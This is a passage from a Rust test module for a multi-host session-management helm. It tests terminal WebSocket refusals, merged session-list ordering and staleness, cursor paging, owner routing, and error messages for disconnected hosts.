    /// that left either one pending must fail this test, not hang it.
    #[tokio::test]
    async fn term_ws_with_unknown_tab_id_surfaces_the_supervisors_not_found_error() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, ErrorKind, TerminalSelector};

        const SENTINEL: &str = "SENTINEL-tab-attach-6e21: no such tab";

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::Attach {
                req_id, terminal, ..
            } = request
            else {
                panic!("expected Attach, got {request:?}");
            };
            assert_eq!(
                terminal,
                TerminalSelector::Tab {
                    id: "no-such-tab".into()
                }
            );
            writer
                .write_control(&ControlMsg::Error {
                    req_id,
                    message: SENTINEL.to_string(),
                    kind: ErrorKind::NotFound,
                })
                .await
                .unwrap();
        });

        let mut harness = rest_harness::spliced_helm(client_side).await;
        let addr = harness.serve().await;
        let (mut ws, peer) = tokio::join!(
            WsTestClient::connect(addr, "/api/sessions/sess-1/term?tab=no-such-tab"),
            peer
        );
        peer.unwrap();

        let (opcode, payload) = tokio::time::timeout(Duration::from_secs(5), ws.recv())
            .await
            .expect("no detach notice arrived")
            .expect("socket closed before sending a notice");
        assert_eq!(opcode, 1, "the detach notice is a text frame");
        let notice: serde_json::Value = serde_json::from_slice(&payload).unwrap();
        assert_eq!(notice["type"], "detached");
        assert!(
            notice["reason"].as_str().unwrap().contains(SENTINEL),
            "reason must carry the supervisor's own message: {notice}"
        );

        assert!(
            tokio::time::timeout(Duration::from_secs(5), ws.recv())
                .await
                .expect("socket never closed after the failed attach's notice")
                .is_none(),
            "the socket must close once the failed attach's notice is sent"
        );
    }

    /// An explicit, empty `?lease=` (as opposed to no `?lease=` at all)
    /// must be REJECTED helm-side (`resolve_attach_request`'s asymmetry,
    /// item 5's own docs): the wire's empty lease IS the legal legacy
    /// meaning, so the supervisor cannot refuse it — accepting `?lease=`
    /// here would silently fold "this client explicitly opted into the
    /// un-leased singleton reading" back into "this client said nothing",
    /// which would make one session view's own terminal sockets take
    /// each other over. The failure path is the same detach-notice-then-
    /// close every other refusal in this file uses, and the scripted peer
    /// proves NO `Attach` ever left the helm for it.
    ///
    /// The no-`Attach` check runs AFTER the WS client has already
    /// observed both the notice and the socket's close — not a fixed
    /// timer racing the request (a flaw an earlier version of this class
    /// of test had for `?tab=`): by the time the client sees the close,
    /// `serve_term` has already returned, so anything it was ever going
    /// to send to the supervisor has already been sent, and checking for
    /// it needs no guess at how long "long enough" is.
    #[tokio::test]
    async fn term_ws_with_empty_lease_is_refused_locally_without_contacting_the_supervisor() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake};

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            reader
        });

        let mut harness = rest_harness::spliced_helm(client_side).await;
        let addr = harness.serve().await;
        let mut ws = WsTestClient::connect(addr, "/api/sessions/sess-1/term?lease=").await;

        let (opcode, payload) = tokio::time::timeout(Duration::from_secs(5), ws.recv())
            .await
            .expect("no detach notice arrived")
            .expect("socket closed before sending a notice");
        assert_eq!(opcode, 1, "the detach notice is a text frame");
        let notice: serde_json::Value = serde_json::from_slice(&payload).unwrap();
        assert_eq!(notice["type"], "detached");
        assert!(
            notice["reason"]
                .as_str()
                .unwrap()
                .contains("must not be empty"),
            "reason must name the empty-lease shape problem: {notice}"
        );

        // Bounded, not indefinite: a regression that left the socket open
        // must fail this test rather than hang it.
        assert!(
            tokio::time::timeout(Duration::from_secs(5), ws.recv())
                .await
                .expect("socket never closed after the local refusal's notice")
                .is_none(),
            "the socket must close once the locally-refused attach's notice is sent"
        );

        // Only NOW — after both the notice and the close are observed, so
        // `serve_term` has already returned and anything it would ever
        // send has already been sent — check that no `Attach` reached the
        // peer. A short timeout suffices: nothing further can arrive at
        // this point, so this is not a race against the request, only a
        // way to turn "nothing queued" into an assertion without blocking
        // forever on a connection this test keeps open indefinitely.
        let mut reader = peer.await.unwrap();
        let got = tokio::time::timeout(Duration::from_millis(200), reader.read_frame()).await;
        assert!(
            got.is_err(),
            "an Attach reached the supervisor for an explicitly empty ?lease=, which must be \
             refused locally instead"
        );
    }

    // ---- Multi-host aggregation and routing (PLAN_M6.md item 5) ------
    //
    // Everything below stands the real serving path up over a scripted
    // FLEET rather than one connection (see `rest_harness`), because the
    // properties are about more than one host at a time: which rows appear
    // together and in what order, which of them are stale, and which host
    // an operation reaches.

    /// Issue one request against `app` and return its status and JSON body.
    ///
    /// The tests below make several requests each and none of them is about
    /// HTTP mechanics, so the builder boilerplate lives here once.
    async fn get_json(
        harness: &rest_harness::Harness,
        uri: &str,
    ) -> (axum::http::StatusCode, serde_json::Value) {
        let request = axum::http::Request::builder()
            .method("GET")
            .uri(uri)
            .header("host", "127.0.0.1:7433")
            .body(axum::body::Body::empty())
            .unwrap();
        let response = tower::ServiceExt::oneshot(harness.router(), request)
            .await
            .unwrap();
        let status = response.status();
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let value = serde_json::from_slice(&body)
            .unwrap_or_else(|_| serde_json::Value::String(String::from_utf8_lossy(&body).into()));
        (status, value)
    }

    /// POST with a JSON body, returning the status and the body as text —
    /// the shape every refusal assertion below needs, since a refusal's
    /// body is prose rather than JSON.
    async fn post_text(
        harness: &rest_harness::Harness,
        uri: &str,
        body: serde_json::Value,
    ) -> (axum::http::StatusCode, String) {
        let request = axum::http::Request::builder()
            .method("POST")
            .uri(uri)
            .header("host", "127.0.0.1:7433")
            .header("content-type", "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap();
        let response = tower::ServiceExt::oneshot(harness.router(), request)
            .await
            .unwrap();
        let status = response.status();
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        (status, String::from_utf8_lossy(&body).into_owned())
    }

    /// The `id` of every row of a session-list body, in order.
    fn row_ids(value: &serde_json::Value) -> Vec<String> {
        value["sessions"]
            .as_array()
            .expect("sessions is an array")
            .iter()
            .map(|row| row["id"].as_str().expect("id is a string").to_string())
            .collect()
    }

    /// A three-host fleet where every host has sessions, sharing one
    /// interleaved creation order — the fixture the merge, ordering, and
    /// staleness assertions all need.
    ///
    /// The interleaving is the point: `created_at` values alternate between
    /// hosts, so a merge that concatenated per-host lists (or sorted only
    /// within a host) would produce a visibly different order rather than
    /// happening to agree.
    async fn three_host_fleet() -> (
        rest_harness::Harness,
        crate::store::HostId,
        crate::store::HostId,
    ) {
        let (builder, alpha) = rest_harness::FleetBuilder::new()
            .await
            .local(rest_harness::HostScript {
                identity: Some("identity-local".to_string()),
                sessions: vec![rest_harness::session("local-mid", 200)],
                ..rest_harness::HostScript::default()
            })
            .await
            .ssh(
                "user@alpha",
                rest_harness::HostScript {
                    identity: Some("identity-alpha".to_string()),
                    sessions: vec![
                        rest_harness::session("alpha-new", 300),
                        rest_harness::session("alpha-old", 100),
                    ],
                    ..rest_harness::HostScript::default()
                },
            )
            .await;
        let (builder, beta) = builder
            .ssh(
                "user@beta",
                rest_harness::HostScript {
                    identity: Some("identity-beta".to_string()),
                    sessions: vec![
                        rest_harness::session("beta-newest", 400),
                        rest_harness::session("beta-oldest", 50),
                    ],
                    ..rest_harness::HostScript::default()
                },
            )
            .await;
        let harness = builder.start().await;
        let local = rest_harness::local_id(&harness.store).await;
        for host in [local, alpha, beta] {
            harness.await_refreshed(host).await;
        }
        (harness, alpha, beta)
    }

    /// The merged list is ONE list: every connected host's sessions in a
    /// single creation-time order, each row naming its host.
    ///
    /// SPEC.md promises "one flat list across all registered hosts, with
    /// each row saying which host it lives on", and the ordering half is
    /// what makes it a list rather than a concatenation. The fixture
    /// interleaves creation times across hosts specifically so a
    /// per-host-then-append implementation fails here instead of passing by
    /// coincidence.
    #[tokio::test]
    async fn the_session_list_merges_every_host_into_one_creation_order() {
        let (harness, alpha, beta) = three_host_fleet().await;
        let local = rest_harness::local_id(&harness.store).await;

        let (status, value) = get_json(&harness, "/api/sessions").await;
        assert_eq!(status, axum::http::StatusCode::OK);
        assert_eq!(
            row_ids(&value),
            vec![
                "beta-newest",
                "alpha-new",
                "local-mid",
                "alpha-old",
                "beta-oldest"
            ],
            "the merge is creation-time descending across hosts, not host by host"
        );
        assert_eq!(value["total"], 5, "total is the merged count");

        let rows = value["sessions"].as_array().unwrap();
        assert_eq!(rows[0]["host"], beta);
        assert_eq!(rows[0]["host_name"], "user@beta");
        assert_eq!(rows[1]["host"], alpha);
        assert_eq!(rows[1]["host_name"], "user@alpha");
        assert_eq!(rows[2]["host"], local);
        assert_eq!(
            rows[2]["host_name"], "this machine",
            "the helm's own machine is described rather than addressed"
        );
        assert!(
            rows.iter().all(|row| row["stale"] == false),
            "every host is connected, so nothing is last-known knowledge"
        );
    }

    /// A host going dark must not remove its sessions from the list: they
    /// stay, marked stale, while every other host's rows keep their place
    /// in the same order.
    ///
    /// This is SPEC.md's central multi-host promise — "sessions on an
    /// unreachable host stay in the list from the helm's last-known
    /// knowledge, clearly marked stale, rather than vanishing" — at the
    /// REST boundary, where the UI actually reads it.
    #[tokio::test]
    async fn a_down_hosts_sessions_stay_listed_and_marked_stale() {
        let (harness, alpha, beta) = three_host_fleet().await;

        harness.fleet.take_down(beta);
        harness
            .await_state(beta, |state| state.phase() == "unreachable-reprobing")
            .await;

        let (status, value) = get_json(&harness, "/api/sessions").await;
        assert_eq!(status, axum::http::StatusCode::OK);
        assert_eq!(
            row_ids(&value),
            vec![
                "beta-newest",
                "alpha-new",
                "local-mid",
                "alpha-old",
                "beta-oldest"
            ],
            "a down host's rows keep their place in the merged order"
        );
        let rows = value["sessions"].as_array().unwrap();
        for row in rows {
            let expected_stale = row["host"] == beta;
            assert_eq!(
                row["stale"], expected_stale,
                "only the down host's rows are stale: {row}"
            );
        }
        assert_eq!(
            rows[1]["host"], alpha,
            "one host going down must not disturb another's rows"
        );
    }

    /// The helm-level cursor walks the MERGED order to exhaustion, page by
    /// page, crossing host boundaries mid-page without any host being asked
    /// anything.
    ///
    /// The decoupling PLAN_M6.md item 5 requires is what makes this
    /// possible at all: the pages come from helm.db, so a page boundary can
    /// fall anywhere in the merged order rather than being pinned to where
    /// some host's own wire page happened to end.
    #[tokio::test]
    async fn the_helm_cursor_walks_the_merged_order_across_host_boundaries() {
        let (harness, _alpha, _beta) = three_host_fleet().await;

        let mut walked: Vec<String> = Vec::new();
        let mut uri = "/api/sessions?limit=2".to_string();
        for _ in 0..10 {
            let (status, value) = get_json(&harness, &uri).await;
            assert_eq!(status, axum::http::StatusCode::OK);
            assert_eq!(value["total"], 5, "every page reports the merged total");
            walked.extend(row_ids(&value));
            match value["next_cursor"].as_str() {
                None => break,
                Some(cursor) => uri = format!("/api/sessions?limit=2&cursor={cursor}"),
            }
        }
        assert_eq!(
            walked,
            vec![
                "beta-newest",
                "alpha-new",
                "local-mid",
                "alpha-old",
                "beta-oldest"
            ],
            "the walk must reproduce the whole merged order exactly once"
        );

        let (status, body) = get_json(&harness, "/api/sessions?cursor=not-a-cursor").await;
        assert_eq!(
            status,
            axum::http::StatusCode::BAD_REQUEST,
            "a tampered cursor is a clean refusal: {body}"
        );
        let (status, _) = get_json(&harness, "/api/sessions?limit=0").await;
        assert_eq!(
            status,
            axum::http::StatusCode::BAD_REQUEST,
            "a zero limit could never make progress through the pages"
        );
    }

    /// A session operation must reach the host that OWNS the session, and
    /// only that host.
    ///
    /// The assertion needs two live hosts, because a single-host fleet
    /// cannot distinguish "routed correctly" from "sent to the only
    /// connection there is" — which is exactly the bug this whole lookup
    /// exists to prevent once a fleet has more than one member.
    #[tokio::test]
    async fn a_session_operation_routes_to_the_host_that_owns_it() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};

        // The host that must NOT be asked, and the one that must.
        let (alpha_client, alpha_peer) = tokio::io::duplex(64 * 1024);
        let alpha_task = tokio::spawn(silent_supervisor(alpha_peer));
        let (beta_client, beta_peer) = tokio::io::duplex(64 * 1024);
        let beta_task = tokio::spawn(async move {
            let (r, w) = tokio::io::split(beta_peer);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::StopSession { req_id, session_id } = request else {
                panic!("expected StopSession, got {request:?}");
            };
            assert_eq!(session_id, "beta-1");
            writer
                .write_control(&ControlMsg::SessionStopped { req_id })
                .await
                .unwrap();
        });

        let (builder, alpha) = rest_harness::FleetBuilder::new()
            .await
            .ssh(
                "user@alpha",
                rest_harness::HostScript {
                    identity: Some("identity-alpha".to_string()),
                    sessions: vec![rest_harness::session("alpha-1", 100)],
                    peer: Some(alpha_client),
                    ..rest_harness::HostScript::default()
                },
            )
            .await;
        let (builder, beta) = builder
            .ssh(
                "user@beta",
                rest_harness::HostScript {
                    identity: Some("identity-beta".to_string()),
                    sessions: vec![rest_harness::session("beta-1", 200)],
                    peer: Some(beta_client),
                    ..rest_harness::HostScript::default()
                },
            )
            .await;
        let harness = builder.start().await;
        harness.await_refreshed(alpha).await;
        harness.await_refreshed(beta).await;

        let (status, body) =
            post_text(&harness, "/api/sessions/beta-1/stop", serde_json::json!({})).await;
        assert_eq!(status, axum::http::StatusCode::OK, "{body}");

        beta_task.await.unwrap();
        alpha_task.await.unwrap();
    }

    /// Every non-connected state refuses a session operation, names itself
    /// in the error, and queues nothing.
    ///
    /// Three states are reached the way they are reached in life — a host
    /// switched off, a host upgraded past this helm's protocol, a host
    /// reinstalled under a new identity — and the assertion is deliberately
    /// uniform across them. SPEC.md refuses lifecycle operations against an
    /// unreachable host; PLAN_M6.md item 5 makes explicit that unreachable
    /// is not special, only common, and that all of these refuse alike. A
    /// helm that special-cased one of them would pass a test written per
    /// state and fail this one.
    ///
    /// The other three states — `connecting`, `duplicate`, `retired` — are
    /// covered by `refusal_text_names_every_non_connected_state` rather than
    /// here. Reaching them through the integration path is either
    /// impractical (a connecting host has to be caught mid-ladder) or
    /// meaningless for a SESSION operation (a duplicate entry and a retired
    /// one connect nothing, so they can never have cached a session to
    /// operate on). What actually has to hold for all six is that the
    /// refusal names the state, and that is what the sibling test pins —
    /// against the same function this path uses.
    ///
    /// Each host CONNECTS first, so its session is genuinely in the merged
    /// view before the host breaks — otherwise there would be nothing to
    /// operate on and the 409 under test would be a 404 instead.
    #[tokio::test]
    async fn every_non_connected_state_refuses_a_session_operation_naming_itself() {
        struct Case {
            /// How the far side changes under the host's feet.
            break_it: fn(&rest_harness::ScriptedFleet, crate::store::HostId),
            /// The phase label the refusal must carry — the same
            /// vocabulary `/api/hosts` chips and the log lines use.
            phase: &'static str,
        }

        let cases = [
            Case {
                break_it: |fleet, host| fleet.take_down(host),
                phase: "unreachable-reprobing",
            },
            Case {
                break_it: |fleet, host| {
                    fleet.edit(host, |script| {
                        script.protocol = farhelm_proto::PROTOCOL_VERSION + 1;
                    });
                    fleet.kill_connection(host);
                },
                phase: "version-skew",
            },
            Case {
                break_it: |fleet, host| {
                    fleet.edit(host, |script| {
                        script.identity = Some("a-different-install".to_string());
                    });
                    fleet.kill_connection(host);
                },
                phase: "identity-mismatch",
            },
        ];

        for case in cases {
            let (builder, host) = rest_harness::FleetBuilder::new()
                .await
                .ssh(
                    "user@breaks",
                    rest_harness::HostScript {
                        identity: Some("identity-original".to_string()),
                        sessions: vec![rest_harness::session("owned", 100)],
                        ..rest_harness::HostScript::default()
                    },
                )
                .await;
            let harness = builder.start().await;
            harness.await_refreshed(host).await;

            (case.break_it)(&harness.fleet, host);
            harness
                .await_state(host, |state| state.phase() == case.phase)
                .await;

            let (status, body) =
                post_text(&harness, "/api/sessions/owned/stop", serde_json::json!({})).await;
            assert_eq!(
                status,
                axum::http::StatusCode::CONFLICT,
                "a {} host must refuse rather than 404 or 500: {body}",
                case.phase
            );
            assert!(
                body.contains(case.phase),
                "the refusal must name the host's state ({}): {body}",
                case.phase
            );
            assert!(
                body.contains("nothing was queued"),
                "the refusal must say nothing was deferred: {body}"
            );

            // Still listed, and still marked as what it is: refusing an
            // operation must not make the session disappear.
            let (_, value) = get_json(&harness, "/api/sessions").await;
            assert_eq!(row_ids(&value), vec!["owned"]);
            assert_eq!(value["sessions"][0]["stale"], true);
        }
    }

    /// Every one of the six non-connected states must name itself in the
    /// refusal, including the three the integration path above cannot
    /// practically reach.
    ///
    /// Asserted against `refusal_text` directly — the single function every
    /// refusal in this crate is built from — because what matters is that
    /// no state falls through to a generic message. A seventh state added
    /// later without a case here fails this test rather than silently
    /// refusing operations with nothing a user can act on.
    #[test]
    fn refusal_text_names_every_non_connected_state() {
        use crate::manager::{HostState, UnreachableCause};

        let cases = [
            (
                HostState::Connecting {
                    attempt: 2,
                    last_error: Some("ssh: connect to host timed out".to_string()),
                },
                "connecting",
                "timed out",
            ),
            (
                HostState::Unreachable {
                    cause: UnreachableCause::TransportFailure,
                    last_error: "no route to host".to_string(),
                },
                "unreachable-reprobing",
                "no route to host",
            ),
            (
                HostState::VersionSkew {
                    peer_protocol: 9,
                    peer_build: "0.0.2".to_string(),
                    our_protocol: 8,
                    our_build: "0.0.1".to_string(),
                    remediation: "update this helm".to_string(),
                },
                "version-skew",
                "update this helm",
            ),
            (
                HostState::IdentityMismatch {
                    recorded: "identity-old".to_string(),
                    reported: "identity-new".to_string(),
                },
                "identity-mismatch",
                "identity-new",
            ),
            (
                HostState::Duplicate {
                    twin: 7,
                    identity: "identity-shared".to_string(),
                },
                "duplicate",
                "host 7",
            ),
            (
                HostState::Retired {
                    reason: "its connection actor panicked".to_string(),
                },
                "retired",
                "panicked",
            ),
        ];
        assert_eq!(
            cases.len(),
            6,
            "all six non-connected states are covered; a seventh needs a case here"
        );
        for (state, phase, detail) in cases {
            let text = super::refusal_text(42, &state);
            assert!(
                text.contains(phase),
                "the refusal must name the phase {phase:?}: {text}"
            );
            assert!(
                text.contains(detail),
                "the refusal must carry the state's own evidence ({detail:?}): {text}"
            );
            assert!(
                text.contains("nothing was queued"),
                "every refusal must say nothing was deferred: {text}"
            );
            assert!(
                text.contains("host 42"),
                "every refusal must name the host: {text}"
            );
        }
    }

    /// Creating on a non-connected host is a PRECONDITION FAILURE: a
    /// visible error naming the host's state, and no session anywhere.
    ///
    /// SPEC.md lists "unreachable host" beside "nonexistent directory" as a
    /// precondition that fails a create outright, and the silent supervisor
    /// is what turns "no session anywhere" into an assertion rather than a
    /// claim — a helm that refused the caller but still sent the create
    /// would leave a real agent running that nobody asked for.
    #[tokio::test]
    async fn creating_on_a_non_connected_host_is_refused_with_no_session() {
        let (alpha_client, alpha_peer) = tokio::io::duplex(64 * 1024);
        let alpha_task = tokio::spawn(silent_supervisor(alpha_peer));

        let (builder, down) = rest_harness::FleetBuilder::new()
            .await
            .local(rest_harness::HostScript {
                identity: Some("identity-local".to_string()),
                peer: Some(alpha_client),
                ..rest_harness::HostScript::default()
            })
            .await
            .ssh(
                "user@down",
                rest_harness::HostScript {
                    reachable: false,
                    ..rest_harness::HostScript::default()
                },
            )
            .await;
        let harness = builder.start().await;
        let local = rest_harness::local_id(&harness.store).await;
        harness.await_refreshed(local).await;
        harness
            .await_state(down, |state| state.phase() == "unreachable-reprobing")
            .await;

        let (status, body) = post_text(
            &harness,
            "/api/sessions",
            serde_json::json!({
                "cwd": "/tmp",
                "invocation": "agent",
                "host": down,
            }),
        )
        .await;
        assert_eq!(
            status,
            axum::http::StatusCode::CONFLICT,
            "a create against a down host fails as a precondition: {body}"
        );
        assert!(
            body.contains("unreachable-reprobing"),
            "the error must name the host's state: {body}"
        );

        // The connected host must not have been used as a fallback: a
        // create that silently landed somewhere else would be worse than
        // one that failed.
        alpha_task.await.unwrap();
    }

    /// A create that names no host lands on the reserved LOCAL row, and one
    /// that names a host lands there instead.
    ///
    /// The default is the tail of SPEC.md's own creation default ("…else
    /// the helm's own host"), and keeping it a default rather than a
    /// requirement is what leaves a curl or a script meaning the obvious
    /// thing. Both halves are asserted against a two-host fleet, since a
    /// single-host fleet cannot tell a default from an accident.
    #[tokio::test]
    async fn a_create_defaults_to_the_local_host_and_honors_an_explicit_one() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};

        /// Answer one `CreateSession` with a session whose id says which
        /// host answered.
        async fn create_once(peer_side: tokio::io::DuplexStream, id: &'static str) {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::CreateSession { req_id, .. } = request else {
                panic!("expected CreateSession, got {request:?}");
            };
            writer
                .write_control(&ControlMsg::SessionCreated {
                    req_id,
                    session: rest_harness::session(id, 1),
                })
                .await
                .unwrap();
        }

        for (explicit, expected) in [(false, "created-on-local"), (true, "created-on-remote")] {
            let (local_client, local_peer) = tokio::io::duplex(64 * 1024);
            let local_task = tokio::spawn(create_once(local_peer, "created-on-local"));
            let (remote_client, remote_peer) = tokio::io::duplex(64 * 1024);
            let remote_task = tokio::spawn(create_once(remote_peer, "created-on-remote"));

            let (builder, remote) = rest_harness::FleetBuilder::new()
                .await
                .local(rest_harness::HostScript {
                    identity: Some("identity-local".to_string()),
                    peer: Some(local_client),
                    ..rest_harness::HostScript::default()
                })
                .await
                .ssh(
                    "user@remote",
                    rest_harness::HostScript {
                        identity: Some("identity-remote".to_string()),
                        peer: Some(remote_client),
                        ..rest_harness::HostScript::default()
                    },
                )
                .await;
            let harness = builder.start().await;
            let local = rest_harness::local_id(&harness.store).await;
            harness.await_refreshed(local).await;
            harness.await_refreshed(remote).await;

            let mut body = serde_json::json!({ "cwd": "/tmp", "invocation": "agent" });
            if explicit {
                body["host"] = serde_json::json!(remote);
            }
            let (status, text) = post_text(&harness, "/api/sessions", body).await;
            assert_eq!(status, axum::http::StatusCode::OK, "{text}");
            let created: serde_json::Value = serde_json::from_str(&text).unwrap();
            assert_eq!(
                created["id"],
                expected,
                "a create with host {} must land on {expected}",
                if explicit { "named" } else { "omitted" }
            );

            // Whichever peer was not chosen is still parked on its read;
            // aborting is how this test declines to wait for it.
            local_task.abort();
            remote_task.abort();
        }
    }

    /// A terminal socket for a session on a non-connected host must be
    /// refused the same way every other operation is — and must SAY so, as
    /// the ordinary `detached` notice, rather than closing bare.
    ///
    /// SPEC.md wants "no terminal to show and no pretense of one", and a
    /// silent close is exactly a pretense the browser would blame on the
    /// network. Riding the existing notice shape is also what lets the UI
    /// render this without a new message type.
    #[tokio::test]
    async fn a_terminal_socket_on_a_down_host_is_refused_with_the_hosts_state() {
        let (builder, host) = rest_harness::FleetBuilder::new()
            .await
            .ssh(
                "user@breaks",
                rest_harness::HostScript {
                    identity: Some("identity-original".to_string()),
                    sessions: vec![rest_harness::session("owned", 100)],
                    ..rest_harness::HostScript::default()
                },
            )
            .await;
        let mut harness = builder.start().await;
        harness.await_refreshed(host).await;
        harness.fleet.take_down(host);
        harness
            .await_state(host, |state| state.phase() == "unreachable-reprobing")
            .await;

        let addr = harness.serve().await;
        let mut ws = WsTestClient::connect(addr, "/api/sessions/owned/term").await;
        let (opcode, payload) = ws.recv().await.expect("a notice, not a bare close");
        assert_eq!(opcode, 1, "the refusal arrives as a text notice");
        let notice: serde_json::Value = serde_json::from_slice(&payload).unwrap();
        assert_eq!(notice["type"], "detached");
        let reason = notice["reason"].as_str().unwrap();
        assert!(
            reason.contains("unreachable-reprobing"),
            "the notice must name the host's state: {reason}"
        );
        assert!(
            ws.recv().await.is_none(),
            "the socket closes once its refusal is delivered"
        );
    }

    /// A session created HERE must be operable at once — the create's own
    /// reply is not a promise the helm may then take a refresh interval to
    /// honour.
    ///
    /// This is a regression test for a real gap, not a hypothetical: owner
    /// routing resolves hosts from the cache, and for a while `create`
    /// never seeded it, so the create dialog's own flow — create, then open
    /// the terminal — 404'd until the owning host's next refresh. Every
    /// verb is exercised because they route through one lookup and the
    /// failure was in the lookup, not in any one of them.
    ///
    /// No refresh tick is allowed to rescue it: the harness's cadence
    /// refreshes once at connect and then not for an hour, so anything that
    /// works here worked because the create seeded it.
    #[tokio::test]
    async fn a_session_created_here_is_routable_before_any_refresh() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            // Create, then answer every later request for the session it
            // just minted. The point is that these are REACHED at all.
            loop {
                let Ok(Some(frame)) = reader.read_frame().await else {
                    return;
                };
                match parse_control(&frame) {
                    Ok(ControlMsg::CreateSession { req_id, .. }) => writer
                        .write_control(&ControlMsg::SessionCreated {
                            req_id,
                            session: rest_harness::session("brand-new", 900),
                        })
                        .await
                        .unwrap(),
                    Ok(ControlMsg::StopSession { req_id, session_id }) => {
                        assert_eq!(session_id, "brand-new");
                        writer
                            .write_control(&ControlMsg::SessionStopped { req_id })
                            .await
                            .unwrap();
                    }
                    Ok(ControlMsg::RenameSession {
                        req_id, session_id, ..
                    }) => {
                        assert_eq!(session_id, "brand-new");
                        writer
                            .write_control(&ControlMsg::SessionRenamed {
                                req_id,
                                session: rest_harness::session("brand-new", 900),
                            })
                            .await
                            .unwrap();
                    }
                    _ => return,
                }
            }
        });

        // The scripted host's own list is EMPTY, so nothing but the create
        // can put this session where routing will find it.
        let harness = rest_harness::spliced_helm_listing(client_side, Vec::new()).await;

        let (status, body) = post_text(
            &harness,
            "/api/sessions",
            serde_json::json!({ "cwd": "/tmp", "invocation": "agent" }),
        )
        .await;
        assert_eq!(status, axum::http::StatusCode::OK, "{body}");
        let created: serde_json::Value = serde_json::from_str(&body).unwrap();
        assert_eq!(created["id"], "brand-new");

        for (uri, request_body) in [
            ("/api/sessions/brand-new/stop", serde_json::json!({})),
            (
                "/api/sessions/brand-new/rename",
                serde_json::json!({ "title": "renamed" }),
            ),
        ] {
            let (status, body) = post_text(&harness, uri, request_body).await;
            assert_eq!(
                status,
                axum::http::StatusCode::OK,
                "{uri} must route immediately after the create that made it: {body}"
            );
        }

        // Deliberately NOT asserted here: the detail route asks the owning
        // host live rather than reading the cache, so what it reports is
        // the scripted list (empty) and not the seed. That is the correct
        // division — the seed exists to make the session ROUTABLE, and the
        // host remains authority for what it is — and asserting otherwise
        // would pin the cache as a detail-serving layer, which PLAN_M6.md
        // explicitly rules out.
        peer.abort();
    }

    /// A connected host reporting NO identity caches nothing, and its
    /// sessions must still list and route — then vanish when it drops.
    ///
    /// The gap this closes was total and silent: the manager deliberately
    /// skips persisting an identity-less host's refreshes (the cache write
    /// is identity-bound), while aggregation and owner lookup read only
    /// persisted rows — so such a host read as connected and EMPTY, with
    /// its sessions absent from the list and unroutable for every
    /// operation.
    ///
    /// The disappearance half is equally deliberate and is asserted here so
    /// nobody "fixes" it later: with no durable copy there is nothing to
    /// vouch for these rows once the connection is gone, so they must not
    /// linger as stale entries the helm cannot stand behind.
    #[tokio::test]
    async fn an_identity_less_hosts_sessions_serve_while_connected_and_vanish_after() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::StopSession { req_id, session_id } = request else {
                panic!("expected StopSession, got {request:?}");
            };
            assert_eq!(session_id, "unbound-1");
            writer
                .write_control(&ControlMsg::SessionStopped { req_id })
                .await
                .unwrap();
        });

        let (builder, host) = rest_harness::FleetBuilder::new()
            .await
            .ssh(
                "user@no-identity",
                rest_harness::HostScript {
                    // A supervisor with no standing to mint one reports
                    // none; the wire allows it and the store cannot bind a
                    // cache write to it.
                    identity: None,
                    sessions: vec![rest_harness::session("unbound-1", 100)],
                    peer: Some(client_side),
                    ..rest_harness::HostScript::default()
                },
            )
            .await;
        let harness = builder.start().await;
        harness.await_refreshed(host).await;

        let (status, value) = get_json(&harness, "/api/sessions").await;
        assert_eq!(status, axum::http::StatusCode::OK);
        assert_eq!(
            row_ids(&value),
            vec!["unbound-1"],
            "an identity-less host's sessions must appear in the merged list"
        );
        assert_eq!(value["total"], 1, "and must be counted in the total");
        assert_eq!(value["sessions"][0]["host"], host);
        assert_eq!(
            value["sessions"][0]["stale"], false,
            "it is connected, so these are live rows"
        );

        // Nothing is persisted — the identity binding has nothing to bind
        // to — which is exactly why the manager has to hold them.
        assert!(
            harness
                .store
                .cached_sessions(host)
                .await
                .expect("cache read")
                .is_empty(),
            "an identity-less host must write no cache at all"
        );

        let (status, body) = post_text(
            &harness,
            "/api/sessions/unbound-1/stop",
            serde_json::json!({}),
        )
        .await;
